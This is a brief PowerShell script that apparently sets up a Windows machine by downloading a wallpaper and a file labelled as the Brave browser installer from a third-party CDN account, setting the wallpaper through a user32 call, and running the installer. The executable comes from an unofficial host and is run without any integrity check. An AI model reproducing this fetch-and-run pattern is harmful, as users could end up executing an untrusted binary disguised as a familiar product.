# Set the URLs for the Brave browser installer and wallpaper
$installerUrl = "https://content.donutcdn.com/@SydneyScripts/Brave.exe"
$wallpaperUrl = "https://content.donutcdn.com/@SydneyScripts/wallpaper.png"

# Set the download paths for the installer and wallpaper
$installerPath = "$env:TEMP\brave.exe"
$wallpaperPath = "$env:TEMP\wallpaper.png"

# Download the Brave browser installer
Write-Host "Downloading Brave browser installer..."
Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath

# Download the wallpaper
Write-Host "Downloading wallpaper..."
Invoke-WebRequest -Uri $wallpaperUrl -OutFile $wallpaperPath

# Set the wallpaper
Write-Host "Setting wallpaper..."
$signature = @"
using System;
using System.Runtime.InteropServices;

public class WallpaperChanger
{
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

    public const int SPI_SETDESKWALLPAPER = 0x0014;
    public const int SPIF_UPDATEINIFILE = 0x01;
    public const int SPIF_SENDCHANGE = 0x02;

    public static void SetWallpaper(string path)
    {
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    }
}
"@

Add-Type -TypeDefinition $signature
[WallpaperChanger]::SetWallpaper($wallpaperPath)

# Run the Brave browser installer
Write-Host "Running Brave browser installer..."
Start-Process -FilePath $installerPath -Wait
